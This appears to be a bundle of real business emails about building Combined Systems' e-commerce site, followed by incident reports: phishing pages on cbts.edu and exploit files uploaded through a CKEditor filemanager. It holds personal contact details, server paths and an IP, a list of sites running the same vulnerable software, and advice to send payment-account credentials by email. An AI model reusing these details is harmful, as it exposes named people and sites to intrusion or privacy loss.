+> 104 East 5th Street, Suite 200  I  Kansas City, MO 64106  I  c] 816.520.1791  I  p] 816.256.3477  I  f] 816.326.0888  I   pdavies@MARKbranding.com  I    www.MARKbranding.com
+>
+> P.S.  Please don't keep us a secret! Your referrals are the lifeblood of our business.  If you know someone who would appreciate the high level of service we provide, please call us immediately, and we will be happy to follow up! Thank you.
+>
+>
+>
+>
+>
+> On Nov 9, 2011, at 4:29 PM, Paul Ford wrote:
+>
+>> Just to confirm 10:30A tomorrow.
+>> -- P
+>>
+>>
+>> From: Paul Davies <pdavies@markbranding.com>
+>> Date: Tue, 8 Nov 2011 11:56:06 -0600
+>> To: Paul Ford <paulford@combinedsystems.com>
+>> Subject: Re: CSI Site Link
+>>
+>> Thursday 10, 10:30 it is!! I'll initiate the call.
+>>
+>> paul
+>>
+>>
+>> Paul Davies
+>> President, MARK Corporate Branding
+>>
+>> 104 East 5th Street, Suite 200  I  Kansas City, MO 64106  I  c] 816.520.1791  I  p] 816.256.3477  I  f] 816.326.0888  I   pdavies@MARKbranding.com  I    www.MARKbranding.com
+>>
+>> P.S.  Please don't keep us a secret! Your referrals are the lifeblood of our business.  If you know someone who would appreciate the high level of service we provide, please call us immediately, and we will be happy to follow up! Thank you.
+>>
+>>
+>>
+>>
+>>
+>> On Nov 8, 2011, at 11:04 AM, Paul Ford wrote:
+>>
+>>> Can we do 1030am ?
+>>>
+>>> Paul Ford
+>>> Sent from my iPhone
+>>>
+>>> On Nov 8, 2011, at 11:44 AM, Paul Davies <pdavies@markbranding.com> wrote:
+>>>
+>>>> Paul,
+>>>>
+>>>> I forwarded this on to Becky, our programmer. We'd like a conference call with you on Thursday morning, 10:00 am or thereabouts... can you be available? If not... shoot back a possible time. Thx.
+>>>>
+>>>> Paul
+>>>>
+>>>>
+>>>> Paul Davies
+>>>> President, MARK Corporate Branding
+>>>>
+>>>> 104 East 5th Street, Suite 200  I  Kansas City, MO 64106  I  c] 816.520.1791  I  p] 816.256.3477  I  f] 816.326.0888  I   pdavies@MARKbranding.com  I    www.MARKbranding.com
+>>>>
+>>>> P.S.  Please don't keep us a secret! Your referrals are the lifeblood of our business.  If you know someone who would appreciate the high level of service we provide, please call us immediately, and we will be happy to follow up! Thank you.
+>>>>
+>>>>
+>>>>
+>>>>
+>>>>
+>>>> On Nov 7, 2011, at 11:07 PM, Paul Ford wrote:
+>>>>
+>>>>> Paul, My answers are below:
+>>>>>
+>>>>> On Nov 4, 2011, at 3:52 PM, Paul Davies wrote:
+>>>>>
+>>>>>> Paul,
+>>>>>>
+>>>>>> I'm hoping you are now recovered from your travels and might find some time to look at where we are on the web site.  Here's the link to the dev site: 
+>>>>>>
+>>>>>> http://csi.markbranding.com/    
+>>>>>>
+>>>>>>
+>>>>>> We have a few questions for you as we're tweaking things:
+>>>>>>
+>>>>>> 1. Handcuffs and Aerosol products are the only ones that can be purchased online - is that still correct?
+>>>>> [Paul Ford] This is still correct. That's not to say that in the future we won't add other products, like gun cleaning kits, weapons sights for the 40MM or other less lethal products that a police officer can purchase himself or a private citizen could buy. I don't see any differentiation from my brief visit to the site or any area designated as a store. Looks like you can put anything in a shopping basket. 
+>>>>>>
+>>>>>> 2.  Each product has 2 prices, Distributor Price and Agency Price. In order to determine who sees what price, customers will need to log in and their account needs to be able to determine which price they see. From our notes, the plan for this is to allow customers to request an account.  CSI will then grant them access and assign them a status of Distributor or Agent.  Currently, all prices are showing on the site - we will remedy this after we talk with you to confirm this feature.
+>>>>> [Paul Ford] That is correct. I see three variations here. You tell me whether or not we can do one or all three. 
+>>>>> 1. Distributors & Independant reps can have access to the site to see current prices (agency and distributor prices).
+>>>>> 2. Distributor Special Price Request - Often our distributors are receiving requests for price quotes. We call them RFQs. These can be very informal and most times are, like faxes, emails and just a telephone call. Or they can be formal and published by the agency. Especially if it is a larger opportunity. At any rate, the distributor knows they are in a competitive situation, so they have to offer the best price they can. So what happens then is they call me and ask for better pricing, lower than published distributor price. What I would like is for a distributor to be able to request a special price quote from CSI by designated the items and quantities. They can also give me us information, like:
+>>>>> - What agency is requesting the price
+>>>>> - When is the bid due
+>>>>> - And maybe a message at the bottom of the where they put in any incidental info. 
+>>>>> 3. An officer from a Police Agency, should be able to log on to the site, select certain items and name the quantity and receive a "Budgetary Quote." I think we should call it a budgetary quote, because everything will be listed at Agency Price. If they were to call their distributor and get the same quote it would be the distributor's discretion on what price and generally be much lower than this. I don't want to scare an agency off, when they get these quotes. Hence, we stress "Budgetary Quote."
+>>>>>>
+>>>>>> 3. How are the details of the Merchant account coming along?  Has a merchant account been established and if so, with which vendor? We     will need a username and password for that account in order to set up the API connection code.
+>>>>> I do remember Becky going over this and this has not been done. We are probably going to need a refresher and I am delegating this responsibility to Amber to get done. 
+>>>>>>
+>>>>>> 4. The only product images we have are on the existing site. If there are updated images to be used, please direct us to those.  Otherwise, we will leave the images out for now and allow you to update those yourselves.
+>>>>> Multiple steps here. Again, I'm delegating to Amber / requesting her assistance. It will take both of us. 
+>>>>> 1. Amber figure out a way to get this organized we can take inventory and account for what we have, then save them with logical file names.  Like by model numbers. the The 12GA Super Sock should be something like 2581_1.jpg and 2581_2.jpg.  There is a column on this spreadsheet to enter the files names of photos.
+>>>>> 2. Amber we need to go through our current inventory of digital files and what is currently on our website and see what we have. I cannot find the reworked images that Steve Jones did for the updated CTS Less Lethal Brochure.
+>>>>> 3. Once we know what we are missing, we'll need a plan to get the photos. 
+>>>>>
+>>>>>>
+>>>>>> 5. We would like to go over the Request A Quote feature with you again because our notes on that are pretty old and we had some outstanding questions that we don't think we've come to a conclusion on.
+>>>>> See number two. But I will be available on Thursday and Friday to spend as much time as necessary discussing. 
+>>>>>>
+>>>>>> 6.  We have listed the products in Categories and Subcategories according to the Excel file you sent, but we will want to go over the categorization with you to make sure we've got everything in the correct place.
+>>>>> Agreed
+>>>>>>
+>>>>>> Let me know if you want to talk about this, I can conference call Becky our programmer in also, whatever you are ready forâ€¦
+>>>>> Let's do definitely get together on Thursday or Friday. This is taking more time than we first discussed, but like I said I'm okay with it. I just want to have this done and live before SHOT Show January 16. 
+>>>>>> <
+
+
+Hi, Paul:
+
+Sounds good.  Sales tax, I definitely want to go over to make sure I'm covering that base properly for you.  Not sure about the insurance issue - that may be more internal than website-related, but I look forward to our conversation tomorrow to get everything ironed out and your new site ready on its way to launch.
+
+~B
+
+
+On 11/09/2011 05:35 AM, Paul Ford wrote:
+> Becca, I'm sharing some of the comments from our VP of finance with you. I think her concerns are a little bit over stated, but I do need to discuss these with you when we talk on Thursday. 
+> -- P
+>
+>
+> From: Janet Scott <janetscott@combinedsystems.com>
+> Organization: Combined Systems, Inc.
+> Date: Tue, 8 Nov 2011 15:57:01 -0500
+> To: Richard Edge <RichardEdge@combinedsystems.com>
+> Cc: Paul Ford <paulford@combinedsystems.com>
+> Subject: FW: Merchant Account for new web site
+>
+> Are you aware of this?
+>
+>  
+>
+> There are all kinds of issues, sales tax, insurance, etc that need to be discussed before we jump into this.
+>
+>  
+>
+> If we do not plan it properly, it will not become my emergency.
+>
+>  
+>
+>  
+>
+> Janet
+>
+>  
+>
+> From: Amberlyn Jones [mailto:ajones@combinedsystems.com]
+> Sent: Tuesday, November 08, 2011 3:13 PM
+> To: 'Janet Scott'
+> Cc: 'Paul Ford'
+> Subject: FW: Merchant Account for new web site
+>
+>  
+>
+> Janet,
+>
+>  
+>
+> We need to set up an account to be able to process payments online for aerosols & handcuffs.  Please read below.  Is this something your team should take of care of because of the bank notification?
+>
+>  
+>
+> Amberlyn A. Jones
+>
+> Training & Marketing Specialist
+>
+> Combined Systems, Inc.
+>
+> 388 Kinsman Road
+>
+> Jamestown, PA  16134
+>
+> PH:  724-932-2177 Ext. 119
+>
+> FAX:  724-932-2157
+>
+>  
+>
+> This e-mail message is for the sole use of the intended recipient(s) and may contain confidential and privileged information. Any unauthorized review, use, disclosure, or distribution is prohibited. If you are not the intended recipient, please contact the sender by reply e-mail and destroy all copies of the original e-mail.
+>
+>  
+>
+> From: Rebecca Adamson [mailto:becca.adamson@gmail.com]
+> Sent: Tuesday, November 08, 2011 2:42 PM
+> To: Amberlyn Jones
+> Cc: Paul Davies
+> Subject: Re: Merchant Account for new web site
+>
+>  
+>
+> Hi, Amber:
+>
+> I'd recommend Authorize.net or Cybersource (they're actually the same company now, but two slightly different interfaces.  They're both good).
+>
+> Start an account with one of them and then let your bank know that you intend to take purchases online (be specific about "online", they might need to have you fill out specific paperwork for that).
+>
+> While the bank is working on their end, Cybersource or Authorize can move forward with setting you up in test mode.  They'll give you a username and password to their control panel.  Log in to that to finish the set up (just a couple of questions, I think).  And then forward the username and password to me and I can get the site connected from there.  (You'll be able to change the password after your site goes live, so there won't be any worries about security).
+>
+> http://www.authorize.net/
+>
+> http://www.cybersource.com/
+>
+> As soon as you decide on one, let me know, because I can move forward with that part of the code while we're waiting for the username and password to be issued.
+>
+> Let me know if questions come up.  I've not actually been through thispart of the process myself, I only recommend these two because I've worked with them from a code standpoint so much and I am familiar with their control panels.
+>
+> The sooner, the better.  I've seen this process takes weeks to get to the point where you get a username and password issued. 
+>
+> ~B
+
+
+
+Hi, David:
+
+It shouldn't be necessary to move to another DNS server, just to update the nameserver records.  But, you know more about things on your end, so I'll trust in your way.  The IP address is 69.30.233.88
+
+My understanding is that Paul wants the new site to go live on Tuesday. 
+
+Thanks!
+
+~B
+
+On 01/12/2012 04:22 AM, David Bricca wrote:
+> Hi Rebecca,
+>
+> We just need to know the new IP address of the web server when you are ready to launch the new site.  Moving to another DNS server is too much trouble. 
+>
+> Regards,
+> David Bricca
+> -----------------------
+> Sent from my iPhone
+>
+> On Jan 10, 2012, at 11:35 AM, "Rebecca Adamson" <becca.adamson@gmail.com> wrote:
+>
+>> Hi, Dave:
+>>
+>> Please let me know if I can do anything to assist.  My number is 816.8385.4617.
+>>
+>> Thanks!
+>>
+>> ~Rebecca
+>>
+>> On 01/10/2012 06:06 AM, Paul Ford wrote:
+>>> Happy New Year Dave, 
+>>>
+>>> We are in the process and getting close to launching a new website.   http://csi.markbranding.com/myaccount/login.php
+>>>
+>>> Rebecca, our web developer at Mark Branding has asked about the DNS settings so that when the time comes, we can take the new site live on their servers pointing to NS1.KROMBIE.NET and NS2.KROMBIE.NET
+>>>
+>>> We don't want to do this just yet, but I would guess by Friday afternoon, we will be there. â€¦ I hope. 
+>>>
+>>> Can you assist us with this?
+>>>
+>>> All the best, Paul
+>>>
+>>>
+>>>
+>>> On 01/09/2012 12:52 PM, Paul Ford wrote:
+>>>> Okay. Can we set up a test run for
+>>>> -Distributor log in and RFQ
+>>>> -Agency log in and RFQ
+>>>>
+>>>> Answers:
+>>>> 1. Here are my thoughts, but I'll take your advice. I think by having it on every product increases the probability of the agency and the distributor first finding and second using the feature. 
+>>>>
+>>>> We should also note that the RFQ feature is for US domestic law enforcement agencies and distributors only. Int'l clients will have to use a different method to obtain quotes. 
+>>>>  
+>>>> 2. No, but I will put you in direct contact with the guy who does have all the access. 
+>>>> 3. Yes this is still correct. Before the end of the week, we'll have to make sure that every product has a price listed. 
+>>>> -- P
+>>>>
+>>>>
+>>>> From: Rebecca Adamson <becca.adamson@gmail.com>
+>>>> Date: Fri, 06 Jan 2012 13:47:46 -0600
+>>>> To: Paul Ford <paulford@combinedsystems.com>
+>>>> Cc: Amberlyn Jones <ajones@combinedsystems.com>, Paul Davies <pdavies@markbranding.com>
+>>>> Subject: Questions & Notes
+>>>>
+>>>> Questions:
+>>>>
+>>>>     1.   Right now, I have all products that do not have prices listed to display a Request A Quote button.  But, do you want clients to be able to Request A Quote on any and all products regardless of price listed?
+>>>>
+>>>>     2.  Do you have control of your DNS settings so that when the time comes, we can take the new site live?  We'll need to switch the nameservers to point to 
+>>>>             NS1.KROMBIE.NET and NS2.KROMBIE.NET
+>>> -- P
+>>>
+>>>
+>>> From: Rebecca Adamson <becca.adamson@gmail.com>
+>>> Date: Mon, 09 Jan 2012 13:07:25 -0600
+>>> To: Paul Ford <paulford@combinedsystems.com>
+>>> Cc: Amberlyn Jones <ajones@combinedsystems.com>, Paul Davies <pdavies@markbranding.com>
+>>> Subject: Re: Questions & Notes
+>>>
+>>> Hi, Paul:
+>>>
+>>> Go ahead and create a test account for a Distributor and then one for an Agency.  http://csi.markbranding.com/myaccount/login.php
+>>>
+>>> Using those test accounts, you can log in and do a test run of the RFQ's.   This will allow you to see the entire process that your clients will go through in creating an account, and so forth - puts you in their shoes, so to speak.  
+>>>
+>>> Note:  You will need to "approve" the accounts in the admin panel before your created test accounts can log in.
+>>>
+>>> I will put the RFQ button on every product, as you suggested.  And, then, I'll add some wording about US-only.
+>>>
+>>> We should get our ducks lined up as soon as we can on changing the DNS.  It can sometimes take 24-48 after making the change before it takes effect across the web.
+>>>
+>>> ~B
+>>>
+>>>
+>>>
+>>> On 01/09/2012 12:52 PM, Paul Ford wrote:
+>>>> Okay. Can we set up a test run for
+>>>> -Distributor log in and RFQ
+>>>> -Agency log in and RFQ
+>>>>
+>>>> Answers:
+>>>> 1. Here are my thoughts, but I'll take your advice. I think by having it on every product increases the probability of the agency and the distributor first finding and second using the feature. 
+>>>>
+>>>> We should also note that the RFQ feature is for US domestic law enforcement agencies and distributors only. Int'l clients will have to use a different method to obtain quotes. 
+>>>>  
+>>>> 2. No, but I will put you in direct contact with the guy who does have all the access. 
+>>>> 3. Yes this is still correct. Before the end of the week, we'll have to make sure that every product has a price listed. 
+>>>> -- P
+>>>>
+>>>>
+>>>> From: Rebecca Adamson <becca.adamson@gmail.com>
+>>>> Date: Fri, 06 Jan 2012 13:47:46 -0600
+>>>> To: Paul Ford <paulford@combinedsystems.com>
+>>>> Cc: Amberlyn Jones <ajones@combinedsystems.com>, Paul Davies <pdavies@markbranding.com>
+>>>> Subject: Questions & Notes
+>>>>
+>>>> Questions:
+>>>>
+>>>>     1.   Right now, I have all products that do not have prices listed to display a Request A Quote button.  But, do you want clients to be able to Request A Quote on any and all products regardless of price listed?
+>>>>
+>>>>     2.  Do you have control of your DNS settings so that when the time comes, we can take the new site live?  We'll need to switch the nameservers to point to 
+>>>>             NS1.KROMBIE.NET and NS2.KROMBIE.NET
+>>>>
+>>>>     3. My notes tell me that you want real-time price calculating for the Budgetary Quote.  But not for Request a Quote (for Distributors), is this still correct? Some of the products do not have prices yet, so I just want to make sure that's still the plan.
+
+Subject 	Fwd: CSI New Project: Website Redesign
+Sender 	Paul Davies Add contact
+Recipient 	Peter DeMarco Add contact
+Date 	11.02.2011 16:23
+
+    Website Redesign_021111.doc
+
+Peter,
+
+I just got this, this morning. Are you interested? It may sound bigger than what it is, but... video, shopping cart, admin... kinda borderline between you and Scotty, right? But i have not sent this to Scotty yet, unless you pass on it.
+
+Paul
+
+
+Paul
+Paul Davies
+President, MARK Corporate Branding
+
+104 East 5th Street, Suite 200  I  Kansas City, MO 64106  I  c] 816.520.1791  I  p] 816.256.3477  I  f] 800.260.4069  I   pdavies@MARKbranding.com  I    www.MARKbranding.com
+
+P.S.  Please don't keep us a secret! Your referrals are the lifeblood of our business.  If you know someone who would appreciate the high level of service we provide, please call us immediately, and we will be happy to follow up! Thank you.
+
+
+Begin forwarded message:
+
+    From: "Paul Ford" <paulford@combinedsystems.com>
+    Date: February 11, 2011 9:55:45 AM CST
+    To: "'Paul Davies'" <pdavies@markbranding.com>
+    Subject: CSI New Project: Website Redesign
+
+    Paul ,
+     
+    I went over my plans for the website this week with Richard Edge. He thinks the site we have is okay and that we just need to include the new handcuff site. However, after pushing the benefits of a new site, he is open to a complete redo if I can justify it. So, Iâ€™m putting together a one-pager for him this week describing how a new site would be better and how in the long run it would make better financial sense â€“ either by saving us money or making us money. For this project, I have to get three quotes, but that doesnâ€™t necessarily mean I have to go with cheapest, rather the best value for the money.  
+     
+    For the complete redo, there are several things I need  and I have included this in the creative brief. Hereâ€™s a couple I just want to stress:
+     
+    1.     E-commerce (shopping cart) capability for handcuffs and pepper spray and maybe some accessories and apparel. Also, please include any recurring monthly costs on for shopping cart capability and if you know any cost per transaction.
+    2.     Better organization and access to the product specification sheets. I think what we have now is terrible.
+    3.     The final product should incorporate all these sites in a logical architecture:
+    a.     www.combinedsystems.com    ---   thatâ€™s the main gateway to the companies sites that presents the product lines as the CSI family of companies or brands. Iâ€™ve include some examples of sites in the creative brief. I think the Taser and Defense Technology sites are most impressive and look the most professional. I actually think we could adopt something similar organizational format. I also think it makes sense to organize our sites the same way our brochures are organized.
+                                                        i.     www.less-lethal.com   -- CTS Less Lethal product line
+                                                      ii.     www.pennarms.com  -- Penn Arms Launchers
+                                                     iii.     www.handcuffsusa.com  --
+    4.     We are interested in including videos, either initially  or priced out as an option that we can add on later if decide not to include at first.
+    5.     Also would be interested in something dynamic or different. Like something that is always changing, like a newsfeed or perhaps an instant messaging system where during business hours you can talk to a customer service rep live.
+    6.     Last thing, the recurring monthly costs on our website are too much. We want to be able to give a couple of our employees a little bit of training and make minor changes to the website ourselves. Examples of changes would be: training calendar updates, change out a photo, make small corrections to paragraphâ€™s content. I think we should also note the things that still will require maintenance on a monthly or quarterly basis and what those costs are estimated to be.
+     
+    If all goes well I would like to get this project approved soon and be ready to begin the project sometime in late February or March.
+     
+    If the approval for the complete redo is not successful at the bare minimum, I will be redesigning thewww.handcuffsusa.com site.
+     
+    Regards, Paul
+    
+    
+    
+
+Subject 	Re: FW: Phishing notification regarding cbts.edu
+Sender 	Peter DeMarco Add contact
+Recipient 	Francisco Litardo Add contact
+Copy 	becca.adamson@gmail.com Add contact, Paul Davies Add contact, John Gravley Add contact
+Date 	Sat 00:57
+It looks like the vulnerability came in through another site. I'm locking down the initial entry point and sweeping the system. We'll be looking to into it more over the weekend.
+
+- Peter
+
+
+On 2/10/2012 6:47 PM, Francisco Litardo wrote:
+
+    Thanks. Please keep us posted. We are traveling through Asia and are accessing wifi at times. Let us know if that has anything to do with it.
+
+    Francisco
+    From: Peter DeMarco [peter@tensquirrel.com]
+    Sent: Friday, February 10, 2012 6:39 PM
+    To: Francisco Litardo
+    Cc: becca.adamson@gmail.com; becky@tensquirrel.com; Paul Davies; John Gravley
+    Subject: Re: FW: Phishing notification regarding cbts.edu
+
+    Francisco,
+
+    I've eliminated these and am looking into how they got there.
+
+    - Peter
+
+
+    On 2/10/2012 5:50 PM, Francisco Litardo wrote:
+
+         Hello everyone - I am traveling in Myanmar and Thailand but I am passing this along for you to respond to as soon as possible. Take a look at the e-mails below. Especially our IT vendor's e-mail about you having been Hacked.
+
+        Can you verify this and keep us updated. Please make sure to reply to all so that John Gravley is aware of th e developments. I won't always have access to e-mail.
+
+        Francisco
+        From: Steve Guinn
+        Sent: Friday, February 10, 2012 2:06 PM
+        To: John Gravley; Francisco Litardo
+        Cc: Jon Miller
+        Subject: FW: Phishing notification regarding cbts.edu
+
+        For immediate attention.  Please see message below from Google about suspicious URLs on our website.   This is likely something our web hosting service will need to address/investigate/etc.
+
+         
+
+        Steve Guinn
+
+        Assistant to the Dean
+
+        913-667-5700 ext. 107
+
+         
+
+        From: Jon Miller [mailto:jmiller@integritykc.com]
+        Sent: Friday, February 10, 2012 2:02 PM
+        To: Steve Guinn
+        Subject: FW: Phishing notification regarding cbts.edu
+
+         
+
+        Hi Steve,
+
+         
+
+        Looks like our web hosts got hacked. They need to get this fixed as soon as possible.
+
+         
+
+        Description: cid:image001.jpg@01CC9EE8.B53C7020
+
+        Email Support:
+        	
+
+        help@integritykc.com
+
+        Live Chat:
+        	
+
+        www.integritykc.com
+
+        Emergency Line:
+        	
+
+        913-324-8404 x1
+
+         
+
+         
+
+        From: noreply@google.com [mailto:noreply@google.com]
+        Sent: Friday, February 10, 2012 12:05 PM
+        To: abuse@cbts.edu; admin@cbts.edu; administrator@cbts.edu; contact@cbts.edu; info@cbts.edu; postmaster@cbts.edu; support@cbts.edu; webmaster@cbts.edu
+        Subject: Phishing notification regarding cbts.edu
+
+         
+
+        Dear site owner or webmaster of cbts.edu,
+
+        We recently discovered that some pages on your site look like a possible phishing attack, in which users are encouraged to give up sensitive information such as login credentials or banking information. We have removed the suspicious URLs from Google.com search results and have begun showing a warning page to users who visit these URLs in certain browsers that receive anti-phishing data from Google.
+
+        Below are one or more example URLs on your site which may be part of a phishing attack:
+
+        http://www.cbts .edu/Paypal.com/webscr/
+        http://www.cbts .edu/Paypal.com/webscr/update.php
+
+        Here is a link to a sample warning page:
+        http://www.google.com/interstitial?url=http%3A//www.cbts.edu/Paypal.com/webscr/
+
+        We strongly encourage you to investigate this immediately to protect users who are being directed to a suspected phishing attack being hosted on your web site. Although some sites intentionally host such attacks, in many cases the webmaster is unaware because:
+
+        1) the site was compromised
+        2) the site doesn't monitor for malicious user-contributed content
+
+        If your site was compromised, it's important to not only remove the content involved in the phishing attack, but to also identify and fix the vulnerability that enabled such content to be placed on your site. We suggest contacting your hosting provider if you are unsure of how to proceed.
+
+        Once you've secured your site, and removed the content involved in the suspected phishing attack, or if you believe we have made an error and this is not actually a phishing attack, you can request that the warning be removed by visiting
+        http://www.google.com/safebrowsing/report_error/?tpl=emailer
+        and reporting an "incorrect forgery alert." We will review this request and take the appropriate actions.
+
+        Sincerely,
+        Google Search Quality Team
+
+        Note: if you have an account in Google's Webmaster Tools, you can verify the authenticity of this message by logging into https://www.google.com/webmasters/tools/siteoverview and going to the Message Center, where a warning will appear shortly.
+
+
+
+    -- 
+    Peter DeMarco
+    Ten Squirrel, LLC
+    816.878.3624
+
+
+
+-- 
+Peter DeMarco
+Ten Squirrel, LLC
+816.878.3624
+
+
+
+    
+
+Subject 	Re: CSI uploads
+Sender 	Peter DeMarco Add contact
+Recipient 	Rebecca Adamson Add contact, webguy@markbranding.com Add contact, jeremy@geeo.net Add contact
+Date 	Sat 00:44
+Copying Jeremy on this as well. This may explain that kernel panic the other day. Going to start looking around.
+
+yinrunning vhosts # cd /var/www/vhosts/www.combinedsystems.com/docroot/cc/ckeditor/filemanager/userfiles/
+yinrunning userfiles # ls
+10  12  14  16  18  2.6  5  7  9            cpanel.php       inboxnchallah.php  user.php
+11  13  15  17  19  4    6  8  cheddar_bay  fleurshi-.-.php  indexa.php         user1.php
+yinrunning userfiles # ls cheddar_bay/
+cheddar_bay.sh  exploit  exploit.c  pwnkernel  pwnkernel.c
+
+Those are obviously exploitative. I'm going to kill the entire directory for the moment.
+
+- Peter
+
+
+On 2/10/2012 6:37 PM, Peter DeMarco wrote:
+
+    Does CSI have any file uploads as part of their site? I've got an intrusive script on the server and it looks like it originated in their ckeditor directories.
+
+    -- 
+    Peter DeMarco
+    Ten Squirrel, LLC
+    816.878.3624
+
+
+
+-- 
+Peter DeMarco
+Ten Squirrel, LLC
+816.878.3624
+
+    
+
+
+
+From: Ron Daniel <ron@fireflymkt.com>
+Subject: Fwd: A couple sites found hacked on your fireflymkt.com vps
+To: You <becky@fireflymkt.com>
+Date: 2/12/12 7:13 PM
+
+------
+
+Becky thought you needed to know this.
+
+Sent from my iPad
+
+Begin forwarded message:
+
+> From: David Lowe <dlowe@hardhathosting.com>
+> Date: February 12, 2012 4:11:49 PM CST
+> To: Ron Daniel <ron@fireflymkt.com>
+> Subject: A couple sites found hacked on your fireflymkt.com vps
+>
+> Hi Ron,
+>
+> I found a couple of your sites hacked on your first vps fireflymkt.com. I noticed when your site was using a lot of bandwidth.
+>
+> It looks like the file upload editor part of these sites are vulnerable they uploaded files and were attacking people.
+>
+> I found 3 sites below hacked and a few others that use the same software not sure if it is the software that it was built on or just ckeditor part or filemanager module in ckeditor.
+>
+> I removed the ckeditor part on these sites and scanned all your sites on both vps for malware installed.
+>
+> I removed the uploaded files and moved the ckeditor part to where it says below. I also disabled root direct login via ssh if you login as a user then su root and the password you can get to root.
+>
+> If you want talk about it give us a call tomorrow and we can discuss.
+>
+>
+> Best Regards,
+>
+> David
+>
+>
+> arialliance.org
+> /var/www/vhosts/arialliance.org/httpdocs/cc/ckeditor/filemanager/userfiles/
+>
+> /cc moved to:
+> /root/arialliance.org/ckeditor
+>
+> precisionmfg.com
+> /var/www/vhosts/precisionmfg.com/httpdocs/cc/ckeditor/filemanager/userfiles/
+>
+> /cc moved to:
+> /root/precisionmfg.com/ckeditor
+>
+> gotoacs.com
+> /var/www/vhosts/gotoacs.com/httpdocs/cc/ckeditor/filemanager/userfiles/
+>
+> /cc moved to:
+> /root/gotoacs.com/ckeditor
+>
+> You will need to login as a user the su root -
+> Do to security concerns direct login as root user has been disabled.
+>
+>
+> Other sites with same software and directory structure but not presently hacked not sure if newer or not.
+>
+>
+> billsoft.com
+> m.moumethodist.org
+> m.whatsnextkc.org
+> rkgroupdesignbuild.com
+> tripleloophousewares-dev.com
